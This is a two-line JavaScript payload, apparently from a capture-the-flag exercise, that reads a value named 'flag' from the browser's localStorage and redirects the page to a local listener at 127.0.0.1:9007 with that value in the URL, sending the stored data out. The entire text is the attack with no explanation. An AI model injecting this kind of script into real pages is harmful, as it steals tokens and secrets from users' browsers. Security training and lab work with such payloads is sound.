const flag = localStorage.getItem("flag");

document.location = `http://127.0.0.1:9007?search=${flag}`;
